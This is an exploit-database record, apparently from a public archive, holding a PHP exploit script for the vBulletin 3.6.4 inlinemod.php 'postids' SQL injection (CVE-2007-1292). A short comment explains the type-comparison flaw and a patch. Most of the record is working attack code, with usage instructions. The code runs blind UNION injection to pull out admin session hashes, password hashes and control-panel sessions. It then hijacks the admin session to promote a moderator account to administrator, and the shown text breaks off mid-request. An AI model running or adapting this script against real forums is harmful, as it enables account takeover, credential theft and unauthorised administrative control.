{
  "id": "3387",
  "title": "vBulletin 3.6.4 - &#039;inlinemod.php?postids&#039; SQL Injection",
  "cve": "CVE-2007-1292",
  "vuln_type": "sqli",
  "code": "<?php\r\nprint_r('\r\n-----------------------------------------------------------------------------\r\nvBulletin <= 3.6.4 inlinemod.php \"postids\" sql injection / privilege\r\nescalation by session hijacking exploit\r\nby rgod\r\nmail: retrog at alice dot it\r\nsite: http://retrogod.altervista.org\r\n\r\nWorks regardless of php.ini settings, you need a Super Moderator account\r\nto copy posts among threads, to be launched while admin is logged in to\r\nthe control panel, this will give you full admin privileges\r\nnote: this will flood the forum with empty threads even!\r\n-----------------------------------------------------------------------------\r\n');\r\n\r\nif ($argc<7) {\r\nprint_r('\r\n-----------------------------------------------------------------------------\r\nUsage: php '.$argv[0].' host path user pass forumid postid OPTIONS\r\nhost:      target server (ip/hostname)\r\npath:      path to vbulletin\r\nuser/pass: you need a moderator account\r\nforumid:   existing forum\r\npostid:    existing post\r\nOptions:\r\n -p[port]:    specify a port other than 80\r\n -P[ip:port]: specify a proxy\r\nExample:\r\nphp '.$argv[0].' localhost /vbulletin/ rgod mypass 2 121 -P1.1.1.1:80\r\nphp '.$argv[0].' localhost /vbulletin/ rgod mypass 1 143 -p81\r\n-----------------------------------------------------------------------------\r\n');\r\ndie;\r\n}\r\n/*\r\nvulnerable code in inlinemod.php near lines 185-209:\r\n\r\n...\r\n\tcase 'docopyposts':\r\n\r\n\t\t$vbulletin->input->clean_array_gpc('p', array(\r\n\t\t\t'postids' => TYPE_STR,\r\n\t\t));\r\n\r\n\t\t$postids = explode(',', $vbulletin->GPC['postids']);\r\n\t\tforeach ($postids AS $index => $postid)\r\n\t\t{\r\n\t\t\tif ($postids[\"$index\"] != intval($postid))\r\n\t\t\t{\r\n\t\t\t\tunset($postids[\"$index\"]);\r\n\t\t\t}\r\n\t\t}\r\n\r\n\t\tif (empty($postids))\r\n\t\t{\r\n\t\t\teval(standard_error(fetch_error('no_applicable_posts_selected')));\r\n\t\t}\r\n\r\n\t\tif (count($postids) > $postlimit)\r\n\t\t{\r\n\t\t\teval(standard_error(fetch_error('you_are_limited_to_working_with_x_posts', $postlimit)));\r\n\t\t}\r\n\t\tbreak;\r\n...\r\nwhen an element of $postids array is not an integer, it fails to unset() the proper value.\r\n\r\nAn example:\r\n\r\n<?php\r\n$foo[1]=\"99999) UNION SELECT foo FROM foo WHERE foo=1 LIMIT 1/*\";\r\n$foo[2]=intval($foo[1]);\r\n\r\necho $foo[1].\"\\n\";\r\necho $foo[2].\"\\n\";\r\nif ($foo[1] != $foo[2])\r\n{\r\n echo \"they are different\";\r\n}\r\nelse\r\n{\r\n echo \"they match!\";\r\n}\r\n?>\r\n\r\noutput:\r\n\r\n99999) UNION SELECT foo FROM foo WHERE foo=1 LIMIT 1/*\r\n99999\r\nthey match!\r\n\r\nthis because when php tries to comparise a string with an integer\r\nit tries to convert the string in its integer value, it chooses the first integer chars\r\nof the string itself!\r\nso unset() never run!\r\n\r\nthe result is sql injection near lines 3792-3800:\r\n\r\n...\r\n\t$posts = $db->query_read_slave(\"\r\n\t\tSELECT post.postid, post.threadid, post.visible, post.title, post.username, post.dateline, post.parentid, post.userid,\r\n\t\t\tthread.forumid, thread.title AS thread_title, thread.postuserid, thread.visible AS thread_visible, thread.firstpostid,\r\n\t\t\tthread.sticky, thread.open, thread.iconid\r\n\t\tFROM \" . TABLE_PREFIX . \"post AS post\r\n\t\tLEFT JOIN \" . TABLE_PREFIX . \"thread AS thread USING (threadid)\r\n\t\tWHERE postid IN (\" . implode(',', $postids) . \")\r\n\t\tORDER BY post.dateline\r\n\t\");\r\n...\r\n\r\nthis exploit extract various session hashes from the database\r\nto authenticate as admin and to change the privileges of a registered user\r\nI could not find a way to see results inside html, so this asks true/false\r\nquestions to the database, copying posts around threads\r\n\r\npossible patch, replace:\r\nforeach ($postids AS $index => $postid)\r\n\t\t{\r\n\t\t   \tif ($postids[\"$index\"] != intval($postid))\r\n\t\t\t{\r\n\t\t\t    unset($postids[\"$index\"]);\r\n\t\t\t}\r\n\t\t}\r\n\r\nwith:\r\n\r\nforeach ($postids AS $index => $postid)\r\n\t\t{\r\n\t       $postids[\"$index\"]=(int)$postids[\"$index\"];\r\n\t    }\r\n\r\n\r\nand, some line before:\r\n\r\nforeach ($threadids AS $index => $threadid)\r\n\t\t{\r\n\t\t\tif ($threadids[\"$index\"] != intval($threadid))\r\n\t\t\t{\r\n\t\t\t\tunset($threadids[\"$index\"]);\r\n\t\t\t}\r\n\t\t}\r\n\r\nwith:\r\n\r\nforeach ($threadids AS $index => $threadid)\r\n\t\t{\r\n\t       $threadids[\"$index\"]=(int)$threadids[\"$index\"];\r\n\t    }\r\n\r\n\r\nvendor was contacted by email form...\r\n*/\r\n\r\nerror_reporting(7);\r\nini_set(\"max_execution_time\",0);\r\nini_set(\"default_socket_timeout\",5);\r\n\r\nfunction quick_dump($string)\r\n{\r\n  $result='';$exa='';$cont=0;\r\n  for ($i=0; $i<=strlen($string)-1; $i++)\r\n  {\r\n   if ((ord($string[$i]) <= 32 ) | (ord($string[$i]) > 126 ))\r\n   {$result.=\"  .\";}\r\n   else\r\n   {$result.=\"  \".$string[$i];}\r\n   if (strlen(dechex(ord($string[$i])))==2)\r\n   {$exa.=\" \".dechex(ord($string[$i]));}\r\n   else\r\n   {$exa.=\" 0\".dechex(ord($string[$i]));}\r\n   $cont++;if ($cont==15) {$cont=0; $result.=\"\\r\\n\"; $exa.=\"\\r\\n\";}\r\n  }\r\n return $exa.\"\\r\\n\".$result;\r\n}\r\n$proxy_regex = '(\\b\\d{1,3}\\.\\d{1,3}\\.\\d{1,3}\\.\\d{1,3}\\:\\d{1,5}\\b)';\r\nfunction sendpacketii($packet)\r\n{\r\n  global $proxy, $host, $port, $html, $proxy_regex;\r\n  if ($proxy=='') {\r\n    $ock=fsockopen(gethostbyname($host),$port);\r\n    if (!$ock) {\r\n      echo 'No response from '.$host.':'.$port; die;\r\n    }\r\n  }\r\n  else {\r\n\t$c = preg_match($proxy_regex,$proxy);\r\n    if (!$c) {\r\n      echo 'Not a valid proxy...';die;\r\n    }\r\n    $parts=explode(':',$proxy);\r\n    echo \"Connecting to \".$parts[0].\":\".$parts[1].\" proxy...\\r\\n\";\r\n    $ock=fsockopen($parts[0],$parts[1]);\r\n    if (!$ock) {\r\n      echo 'No response from proxy...';die;\r\n\t}\r\n  }\r\n  fputs($ock,$packet);\r\n  if ($proxy=='') {\r\n    $html='';\r\n    while (!feof($ock)) {\r\n      $html.=fgets($ock);\r\n    }\r\n  }\r\n  else {\r\n    $html='';\r\n    while ((!feof($ock)) or (!eregi(chr(0x0d).chr(0x0a).chr(0x0d).chr(0x0a),$html))) {\r\n      $html.=fread($ock,1);\r\n    }\r\n  }\r\n  fclose($ock);\r\n}\r\n\r\n$host=$argv[1];\r\n$path=$argv[2];\r\n$user=$argv[3];\r\n$pass=md5($argv[4]);\r\n$forumid=(int)$argv[5];\r\n$existing_post=(int)$argv[6];\r\n\r\n$port=80;\r\n$proxy=\"\";\r\nfor ($i=3; $i<$argc; $i++){\r\n$temp=$argv[$i][0].$argv[$i][1];\r\nif (($temp<>\"-p\") and ($temp<>\"-P\")) {$cmd.=\" \".$argv[$i];}\r\nif ($temp==\"-p\")\r\n{\r\n  $port=str_replace(\"-p\",\"\",$argv[$i]);\r\n}\r\nif ($temp==\"-P\")\r\n{\r\n  $proxy=str_replace(\"-P\",\"\",$argv[$i]);\r\n}\r\n}\r\nif (($path[0]<>'/') or ($path[strlen($path)-1]<>'/')) {echo 'Error... check the path!'; die;}\r\nif ($proxy=='') {$p=$path;} else {$p='http://'.$host.':'.$port.$path;}\r\n\r\n$data=\"vb_login_username=$user\";\r\n$data.=\"&vb_login_password=\";\r\n$data.=\"&s=\";\r\n$data.=\"&do=login\";\r\n$data.=\"&vb_login_md5password=$pass\";\r\n$data.=\"&vb_login_md5password_utf=$pass\";\r\n$packet=\"POST \".$p.\"login.php HTTP/1.0\\r\\n\";\r\n$packet.=\"Accept: image/gif, image/x-xbitmap, image/jpeg, image/pjpeg, application/x-shockwave-flash, */*\\r\\n\";\r\n$packet.=\"Referer: http://\".$host.$path.\"login.php\\r\\n\";\r\n$packet.=\"Accept-Language: en\\r\\n\";\r\n$packet.=\"Content-Type: application/x-www-form-urlencoded\\r\\n\";\r\n$packet.=\"User-Agent: Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 5.1)\\r\\n\";\r\n$packet.=\"Host: \".$host.\"\\r\\n\";\r\n$packet.=\"Content-Length: \".strlen($data).\"\\r\\n\";\r\n$packet.=\"Pragma: no-cache\\r\\n\";\r\n$packet.=\"Connection: Close\\r\\n\\r\\n\";\r\n$packet.=$data;\r\nsendpacketii($packet);\r\n$cookie=\"\";\r\n$temp=explode(\"Set-Cookie: \",$html);\r\nfor ($i=1; $i<count($temp); $i++)\r\n{\r\n  $temp2=explode(\" \",$temp[$i]);\r\n  $cookie.=\" \".trim($temp2[0]);\r\n}\r\n//echo \"your cookie -> \".$cookie.\"\\n\\n\";\r\nif (!eregi(\"sessionhash\",$cookie)){die(\"failed to login...\");}$temp=str_replace(\" \",\"\",$cookie);$temp=str_replace(\"sessionhash\",\"\",$temp);\r\n$temp=str_replace(\"lastvisit\",\"\",$temp);$temp=str_replace(\"lastactivity\",\"\",$temp);$temp=explode(\"=\",$temp);$temp=explode(\";\",$temp[1]);\r\n$cookie_prefix=trim($temp[1]);echo \"cookie prefix -> \".$cookie_prefix.\"\\n\";\r\n\r\n$chars[0]=0;//null\r\n$chars=array_merge($chars,range(48,57)); //numbers\r\n\r\n$j=1;$uid=\"\";\r\necho \"admim user id -> \";\r\nwhile (!strstr($uid,chr(0)))\r\n{\r\n    for ($i=0; $i<=255; $i++)\r\n    {\r\n        if (in_array($i,$chars))\r\n        {\r\n          $data =\"s=\";\r\n          $data.=\"&do=docopyposts\";\r\n          $data.=\"&destforumid=$forumid\";\r\n          $data.=\"&title=suntzu\";\r\n          $data.=\"&forumid=$forumid\";\r\n          $data.=\"&postids=9999999)/**/UNION/**/SELECT/**/(IF((ASCII(SUBSTRING(userid,\".$j.\",1))=\".$i.\"),$existing_post,-999999)),1,1,1,1,1,1,1,1,1,1,1,1,1,1,1/**/FROM/**/user/**/WHERE/**/usergroupid=6/**/LIMIT/**/1/*\";\r\n          $packet =\"POST \".$p.\"inlinemod.php?f=$forumid HTTP/1.0\\r\\n\";\r\n          $packet.=\"Accept: image/gif, image/x-xbitmap, image/jpeg, image/pjpeg, application/x-shockwave-flash, */*\\r\\n\";\r\n          $packet.=\"Referer: http://\".$host.$path.\"profile.php\\r\\n\";\r\n          $packet.=\"Accept-Language: it\\r\\n\";\r\n          $packet.=\"Content-Type: application/x-www-form-urlencoded\\r\\n\";\r\n          $packet.=\"User-Agent: Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 5.1)\\r\\n\";\r\n          $packet.=\"Host: \".$host.\"\\r\\n\";\r\n          $packet.=\"Content-Length: \".strlen($data).\"\\r\\n\";\r\n          $packet.=\"Pragma: no-cache\\r\\n\";\r\n          $packet.=\"Cookie: \".$cookie.\"; \\r\\n\";\r\n          $packet.=\"Connection: Close\\r\\n\\r\\n\";\r\n          $packet.=$data;\r\n          sendpacketii($packet);\r\n          $temp=explode(\"showthread.php?t=\",$html);\r\n          $temp2=explode(\"\\n\",$temp[1]);\r\n          $thread=(int)$temp2[0];\r\n\r\n          $packet =\"GET \".$p.\"showthread.php?t=$thread HTTP/1.0\\r\\n\";\r\n          $packet.=\"Accept: image/gif, image/x-xbitmap, image/jpeg, image/pjpeg, application/x-shockwave-flash, */*\\r\\n\";\r\n          $packet.=\"Referer: http://\".$host.$path.\"profile.php\\r\\n\";\r\n          $packet.=\"Accept-Language: it\\r\\n\";\r\n          $packet.=\"Content-Type: application/x-www-form-urlencoded\\r\\n\";\r\n          $packet.=\"User-Agent: Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 5.1)\\r\\n\";\r\n          $packet.=\"Host: \".$host.\"\\r\\n\";\r\n          $packet.=\"Pragma: no-cache\\r\\n\";\r\n          $packet.=\"Cookie: \".$cookie.\"; \\r\\n\";\r\n          $packet.=\"Connection: Close\\r\\n\\r\\n\";\r\n          sendpacketii($packet);\r\n          if (eregi(\"You have an error in your SQL syntax\",$html)){echo $html; die(\"\\nunknown query error...\");}\r\n          if (eregi(\"join date\",$html)) {$uid.=chr($i);echo chr($i); sleep(1); break;}\r\n        }\r\n        if ($i==255) {\r\n            die(\"\\nExploit failed...\");\r\n        }\r\n    }\r\n$j++;\r\n}\r\nif (trim($uid)==\"\"){die(\"\\nExploit failed...\");}else{echo \"\\nvulnerable!\";}\r\n$uid=intval($uid);\r\n\r\nfunction my_encode($my_string)\r\n{\r\n  $encoded=\"CHAR(\";\r\n  for ($k=0; $k<=strlen($my_string)-1; $k++)\r\n  {\r\n    $encoded.=ord($my_string[$k]);\r\n    if ($k==strlen($my_string)-1) {$encoded.=\")\";}\r\n    else {$encoded.=\",\";}\r\n  }\r\n  return $encoded;\r\n}\r\n\r\n\r\n$j=1;$my_uid=\"\";\r\necho \"\\nyour user id -> \";\r\nwhile (!strstr($my_uid,chr(0)))\r\n{\r\n    for ($i=0; $i<=255; $i++)\r\n    {\r\n        if (in_array($i,$chars))\r\n        {\r\n          $data =\"s=\";\r\n          $data.=\"&do=docopyposts\";\r\n          $data.=\"&destforumid=$forumid\";\r\n          $data.=\"&title=suntzu\";\r\n          $data.=\"&forumid=$forumid\";\r\n          $data.=\"&postids=9999999)/**/UNION/**/SELECT/**/(IF((ASCII(SUBSTRING(userid,\".$j.\",1))=\".$i.\"),$existing_post,-999999)),1,1,1,1,1,1,1,1,1,1,1,1,1,1,1/**/FROM/**/user/**/WHERE/**/username=\".my_encode($user).\"/**/LIMIT/**/1/*\";\r\n          $packet =\"POST \".$p.\"inlinemod.php?f=$forumid HTTP/1.0\\r\\n\";\r\n          $packet.=\"Accept: image/gif, image/x-xbitmap, image/jpeg, image/pjpeg, application/x-shockwave-flash, */*\\r\\n\";\r\n          $packet.=\"Referer: http://\".$host.$path.\"profile.php\\r\\n\";\r\n          $packet.=\"Accept-Language: it\\r\\n\";\r\n          $packet.=\"Content-Type: application/x-www-form-urlencoded\\r\\n\";\r\n          $packet.=\"User-Agent: Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 5.1)\\r\\n\";\r\n          $packet.=\"Host: \".$host.\"\\r\\n\";\r\n          $packet.=\"Content-Length: \".strlen($data).\"\\r\\n\";\r\n          $packet.=\"Pragma: no-cache\\r\\n\";\r\n          $packet.=\"Cookie: \".$cookie.\"; \\r\\n\";\r\n          $packet.=\"Connection: Close\\r\\n\\r\\n\";\r\n          $packet.=$data;\r\n          sendpacketii($packet);\r\n          if (eregi(\"You have an error in your SQL syntax\",$html)){echo $html; die(\"\\nunknown query error...\");}\r\n          $temp=explode(\"showthread.php?t=\",$html);\r\n          $temp2=explode(\"\\n\",$temp[1]);\r\n          $thread=(int)$temp2[0];\r\n\r\n          $packet =\"GET \".$p.\"showthread.php?t=$thread HTTP/1.0\\r\\n\";\r\n          $packet.=\"Accept: image/gif, image/x-xbitmap, image/jpeg, image/pjpeg, application/x-shockwave-flash, */*\\r\\n\";\r\n          $packet.=\"Referer: http://\".$host.$path.\"profile.php\\r\\n\";\r\n          $packet.=\"Accept-Language: it\\r\\n\";\r\n          $packet.=\"Content-Type: application/x-www-form-urlencoded\\r\\n\";\r\n          $packet.=\"User-Agent: Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 5.1)\\r\\n\";\r\n          $packet.=\"Host: \".$host.\"\\r\\n\";\r\n          $packet.=\"Pragma: no-cache\\r\\n\";\r\n          $packet.=\"Cookie: \".$cookie.\"; \\r\\n\";\r\n          $packet.=\"Connection: Close\\r\\n\\r\\n\";\r\n          sendpacketii($packet);\r\n          if (eregi(\"join date\",$html)) {$my_uid.=chr($i);echo chr($i); sleep(1); break;}\r\n        }\r\n        if ($i==255) {\r\n            die(\"\\nExploit failed...\");\r\n        }\r\n    }\r\n$j++;\r\n}\r\n$my_uid=intval($my_uid);\r\n\r\n$chars[0]=0;//null\r\n$chars=array_merge($chars,range(48,57)); //numbers\r\n$chars=array_merge($chars,range(97,102));//a-f letters\r\n$j=1;$sess_hash=\"\";\r\necho \"\\nsession hash -> \";\r\nwhile (!strstr($sess_hash,chr(0)))\r\n{\r\n    for ($i=0; $i<=255; $i++)\r\n    {\r\n      if (in_array($i,$chars))\r\n        {\r\n          $data =\"s=\";\r\n          $data.=\"&do=docopyposts\";\r\n          $data.=\"&destforumid=$forumid\";\r\n          $data.=\"&title=suntzu\";\r\n          $data.=\"&forumid=$forumid\";\r\n          $data.=\"&postids=9999999)/**/UNION/**/SELECT/**/(IF((ASCII(SUBSTRING(sessionhash,\".$j.\",1))=\".$i.\"),$existing_post,-999999)),1,1,1,1,1,1,1,1,1,1,1,1,1,1,1/**/FROM/**/session/**/WHERE/**/userid=$uid/**/LIMIT/**/1/*\";\r\n          $packet =\"POST \".$p.\"inlinemod.php?f=$forumid HTTP/1.0\\r\\n\";\r\n          $packet.=\"Accept: image/gif, image/x-xbitmap, image/jpeg, image/pjpeg, application/x-shockwave-flash, */*\\r\\n\";\r\n          $packet.=\"Referer: http://\".$host.$path.\"profile.php\\r\\n\";\r\n          $packet.=\"Accept-Language: it\\r\\n\";\r\n          $packet.=\"Content-Type: application/x-www-form-urlencoded\\r\\n\";\r\n          $packet.=\"User-Agent: Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 5.1)\\r\\n\";\r\n          $packet.=\"Host: \".$host.\"\\r\\n\";\r\n          $packet.=\"Content-Length: \".strlen($data).\"\\r\\n\";\r\n          $packet.=\"Pragma: no-cache\\r\\n\";\r\n          $packet.=\"Cookie: \".$cookie.\"; \\r\\n\";\r\n          $packet.=\"Connection: Close\\r\\n\\r\\n\";\r\n          $packet.=$data;\r\n          sendpacketii($packet);\r\n          if (eregi(\"You have an error in your SQL syntax\",$html)){echo $html; die(\"\\nunknown query error...\");}\r\n          $temp=explode(\"showthread.php?t=\",$html);\r\n          $temp2=explode(\"\\n\",$temp[1]);\r\n          $thread=(int)$temp2[0];\r\n\r\n          $packet =\"GET \".$p.\"showthread.php?t=$thread HTTP/1.0\\r\\n\";\r\n          $packet.=\"Accept: image/gif, image/x-xbitmap, image/jpeg, image/pjpeg, application/x-shockwave-flash, */*\\r\\n\";\r\n          $packet.=\"Referer: http://\".$host.$path.\"profile.php\\r\\n\";\r\n          $packet.=\"Accept-Language: it\\r\\n\";\r\n          $packet.=\"Content-Type: application/x-www-form-urlencoded\\r\\n\";\r\n          $packet.=\"User-Agent: Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 5.1)\\r\\n\";\r\n          $packet.=\"Host: \".$host.\"\\r\\n\";\r\n          $packet.=\"Pragma: no-cache\\r\\n\";\r\n          $packet.=\"Cookie: \".$cookie.\"; \\r\\n\";\r\n          $packet.=\"Connection: Close\\r\\n\\r\\n\";\r\n          sendpacketii($packet);\r\n          if (eregi(\"join date\",$html)) {$sess_hash.=chr($i);echo chr($i); sleep(1); break;}\r\n        }\r\n        if ($i==255) {\r\n            die(\"\\nExploit failed...\");\r\n        }\r\n    }\r\n$j++;\r\n}\r\n\r\n$j=1;$my_hash=\"\";\r\necho \"\\nuser password hash -> \";\r\nwhile (!strstr($my_hash,chr(0)))\r\n{\r\n    for ($i=0; $i<=255; $i++)\r\n    {\r\n      if (in_array($i,$chars))\r\n        {\r\n          $data =\"s=\";\r\n          $data.=\"&do=docopyposts\";\r\n          $data.=\"&destforumid=$forumid\";\r\n          $data.=\"&title=suntzu\";\r\n          $data.=\"&forumid=$forumid\";\r\n          $data.=\"&postids=9999999)/**/UNION/**/SELECT/**/(IF((ASCII(SUBSTRING(password,\".$j.\",1))=\".$i.\"),$existing_post,-999999)),1,1,1,1,1,1,1,1,1,1,1,1,1,1,1/**/FROM/**/user/**/WHERE/**/userid=$uid/**/LIMIT/**/1/*\";\r\n          $packet =\"POST \".$p.\"inlinemod.php?f=$forumid HTTP/1.0\\r\\n\";\r\n          $packet.=\"Accept: image/gif, image/x-xbitmap, image/jpeg, image/pjpeg, application/x-shockwave-flash, */*\\r\\n\";\r\n          $packet.=\"Referer: http://\".$host.$path.\"profile.php\\r\\n\";\r\n          $packet.=\"Accept-Language: en\\r\\n\";\r\n          $packet.=\"Content-Type: application/x-www-form-urlencoded\\r\\n\";\r\n          $packet.=\"User-Agent: Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 5.1)\\r\\n\";\r\n          $packet.=\"Host: \".$host.\"\\r\\n\";\r\n          $packet.=\"Content-Length: \".strlen($data).\"\\r\\n\";\r\n          $packet.=\"Pragma: no-cache\\r\\n\";\r\n          $packet.=\"Cookie: \".$cookie.\"; \\r\\n\";\r\n          $packet.=\"Connection: Close\\r\\n\\r\\n\";\r\n          $packet.=$data;\r\n          sendpacketii($packet);\r\n          if (eregi(\"You have an error in your SQL syntax\",$html)){echo $html; die(\"\\nunknown query error...\");}\r\n          $temp=explode(\"showthread.php?t=\",$html);\r\n          $temp2=explode(\"\\n\",$temp[1]);\r\n          $thread=(int)$temp2[0];\r\n\r\n\t\t  $packet =\"GET \".$p.\"showthread.php?t=$thread HTTP/1.0\\r\\n\";\r\n          $packet.=\"Accept: image/gif, image/x-xbitmap, image/jpeg, image/pjpeg, application/x-shockwave-flash, */*\\r\\n\";\r\n          $packet.=\"Referer: http://\".$host.$path.\"profile.php\\r\\n\";\r\n          $packet.=\"Accept-Language: en\\r\\n\";\r\n          $packet.=\"Content-Type: application/x-www-form-urlencoded\\r\\n\";\r\n          $packet.=\"User-Agent: Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 5.1)\\r\\n\";\r\n          $packet.=\"Host: \".$host.\"\\r\\n\";\r\n          $packet.=\"Pragma: no-cache\\r\\n\";\r\n          $packet.=\"Cookie: \".$cookie.\"; \\r\\n\";\r\n          $packet.=\"Connection: Close\\r\\n\\r\\n\";\r\n          sendpacketii($packet);\r\n          if (eregi(\"join date\",$html)) {$my_hash.=chr($i);echo chr($i); sleep(1); break;}\r\n        }\r\n        if ($i==255) {\r\n            die(\"\\nExploit failed...\");\r\n        }\r\n    }\r\n$j++;\r\n}\r\n\r\n$j=1;$cpsess_hash=\"\";\r\necho \"\\ncp session hash -> \";\r\nwhile (!strstr($cpsess_hash,chr(0)))\r\n{\r\n    for ($i=0; $i<=255; $i++)\r\n    {\r\n      if (in_array($i,$chars))\r\n        {\r\n          $data =\"s=\";\r\n          $data.=\"&do=docopyposts\";\r\n          $data.=\"&destforumid=$forumid\";\r\n          $data.=\"&title=suntzu\";\r\n          $data.=\"&forumid=$forumid\";\r\n          $data.=\"&postids=9999999)/**/UNION/**/SELECT/**/(IF((ASCII(SUBSTRING(hash,\".$j.\",1))=\".$i.\"),$existing_post,-999999)),1,1,1,1,1,1,1,1,1,1,1,1,1,1,1/**/FROM/**/cpsession/**/WHERE/**/userid=$uid/**/LIMIT/**/1/*\";\r\n          $packet =\"POST \".$p.\"inlinemod.php?f=$forumid HTTP/1.0\\r\\n\";\r\n          $packet.=\"Accept: image/gif, image/x-xbitmap, image/jpeg, image/pjpeg, application/x-shockwave-flash, */*\\r\\n\";\r\n          $packet.=\"Referer: http://\".$host.$path.\"profile.php\\r\\n\";\r\n          $packet.=\"Accept-Language: en\\r\\n\";\r\n          $packet.=\"Content-Type: application/x-www-form-urlencoded\\r\\n\";\r\n          $packet.=\"User-Agent: Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 5.1)\\r\\n\";\r\n          $packet.=\"Host: \".$host.\"\\r\\n\";\r\n          $packet.=\"Content-Length: \".strlen($data).\"\\r\\n\";\r\n          $packet.=\"Pragma: no-cache\\r\\n\";\r\n          $packet.=\"Cookie: \".$cookie.\"; \\r\\n\";\r\n          $packet.=\"Connection: Close\\r\\n\\r\\n\";\r\n          $packet.=$data;\r\n          sendpacketii($packet);\r\n          $temp=explode(\"showthread.php?t=\",$html);\r\n          $temp2=explode(\"\\n\",$temp[1]);\r\n          $thread=(int)$temp2[0];\r\n\r\n          $packet =\"GET \".$p.\"showthread.php?t=$thread HTTP/1.0\\r\\n\";\r\n          $packet.=\"Accept: image/gif, image/x-xbitmap, image/jpeg, image/pjpeg, application/x-shockwave-flash, */*\\r\\n\";\r\n          $packet.=\"Referer: http://\".$host.$path.\"profile.php\\r\\n\";\r\n          $packet.=\"Accept-Language: en\\r\\n\";\r\n          $packet.=\"Content-Type: application/x-www-form-urlencoded\\r\\n\";\r\n          $packet.=\"User-Agent: Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 5.1)\\r\\n\";\r\n          $packet.=\"Host: \".$host.\"\\r\\n\";\r\n          $packet.=\"Pragma: no-cache\\r\\n\";\r\n          $packet.=\"Cookie: \".$cookie.\"; \\r\\n\";\r\n          $packet.=\"Connection: Close\\r\\n\\r\\n\";\r\n          sendpacketii($packet);\r\n          if (eregi(\"You have an error in your SQL syntax\",$html)){echo $html; die(\"\\nunknown query error...\");}\r\n          if (eregi(\"join date\",$html)) {$cpsess_hash.=chr($i);echo chr($i); sleep(1); break;}\r\n        }\r\n        if ($i==255) {\r\n            die(\"\\nExploit failed...\");\r\n        }\r\n    }\r\n$j++;\r\n}\r\necho \"\\n\";\r\n\r\n$packet =\"GET \".$p.\"admincp/user.php?do=edit&u=$my_uid HTTP/1.0\\r\\n\";\r\n$packet.=\"Accept: image/gif, image/x-xbitmap, image/jpeg, image/pjpeg, application/x-shockwave-flash, */*\\r\\n\";\r\n$packet.=\"Referer: http://\".$host.$path.\"profile.php\\r\\n\";\r\n$packet.=\"Accept-Language: en\\r\\n\";\r\n$packet.=\"Content-Type: application/x-www-form-urlencoded\\r\\n\";\r\n$packet.=\"User-Agent: Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 5.1)\\r\\n\";\r\n$packet.=\"Host: \".$host.\"\\r\\n\";\r\n$packet.=\"Pragma: no-cache\\r\\n\";\r\n$packet.=\"Cookie: \".$cookie_prefix.\"lastactivity=0; \".$cookie_prefix.\"password=\".md5(trim($my_hash)).\"; bbuserid=\".$uid.\"; \".$cookie_prefix.\"sessionhash=\".trim($sess_hash).\"; \".$cookie_prefix.\"cpsession=\".trim($cpsess_hash).\";\\r\\n\";\r\n$packet.=\"Connection: Close\\r\\n\\r\\n\";\r\nsendpacketii($packet);\r\n$temp=explode(\"adminhash\\\" value=\\\"\",$html);\r\n$temp2=explode(\"\\\"\",$temp[1]);\r\n$adminhash=$temp2[0];\r\necho \"adminhash ->\".$adminhash.\"\\n\";\r\nif ($adminhash<>\"\") {echo \"\\ndone! you are in... updating \".$user.\" rights\";}\r\nelse {die(\"\\nexploit failed...\");}\r\n\r\n//join to the Administrator group\r\n$my_email=\"suntzu@suntzu.com\";\r\n$data =\"do=update\";\r\n$data.=\"&adminhash=$adminhash\";\r\n$data.=\"&quicklinks=user.php%3Fdo%3Deditaccess%26u%3D\".$my_uid;\r\n$data.=\"&user%5Busername%5D=$user\";\r\n$data.=\"&password=\";\r\n$data.=\"&user%5Bemail%5D=$my_email\";\r\n$data.=\"&user%5Blanguageid%5D=0\";\r\n$data.=\"&user%5Busertitle%5D=Admin\";\r\n$data.=\"&user%5Bcustomtitle%5D=0\";\r\n$data.=\"&user%5Bhomepage%5D=\";\r\n$data.=\"&user%5Bbirthday%5D%5Bmonth%5D=0\";\r\n$data.=\"&user%5Bbirthday%5D%5Bday%5D=\";\r\n$data.=\"&user%5Bbirthday%5D%5Byear%5D=\";\r\n$data.=\"&user%5Bshowbirthday%5D=0\";\r\n$data.=\"&user%5Bsignature%5D=\";\r\n$data.=\"&user%5Bicq%5D=\";\r\n$data.=\"&user%5Baim%5D=\";\r\n$data.=\"&user%5Byahoo%5D=\";\r\n$data.=\"&user%5Bmsn%5D=\";\r\n$data.=\"&user%5Bskype%5D=\";\r\n$data.=\"&options%5Bcoppauser%5D=0\";\r\n$data.=\"&user%5Bparentemail%5D=$my_email\";\r\n$data.=\"&user%5Breferrerid%5D=\";\r\n$data.=\"&user%5Bipaddress%5D=\";\r\n$data.=\"&user%5Bposts%5D=0\";\r\n$data.=\"&userfield%5Bfield1%5D=\";\r\n$data.=\"&userfield%5Bfield2%5D=\";\r\n$data.=\"&userfield%5Bfield3%5D=\";\r\n$data.=\"&userfield%5Bfield4%5D=\";\r\n$data.=\"&user%5Busergroupid%5D=6\";//primary usergroup, 6=Administrators\r\n$data.=\"&user%5Bdisplaygroupid%5D=-1\";\r\n$data.=\"&user%5Bmembergroupids%5D%5B%5D=5\";//secondary usergroup, 5=Super 